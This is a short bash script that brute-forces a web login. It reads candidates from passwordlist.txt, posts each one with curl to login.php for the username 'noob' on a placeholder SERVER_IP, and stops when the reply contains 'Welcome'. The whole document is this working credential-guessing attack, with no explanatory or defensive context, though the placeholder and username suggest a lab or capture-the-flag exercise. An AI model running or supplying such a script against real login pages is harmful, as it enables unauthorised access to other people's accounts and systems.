for pass in $(cat passwordlist.txt); do
  echo "Trying password: $pass"
  response=$(curl -s -X POST -d "username=noob&password=$pass" http://SERVER_IP/login.php)
  if echo "$response" | grep -q "Welcome"; then
    echo "[+] Founded password: $pass"
    break
  fi
done
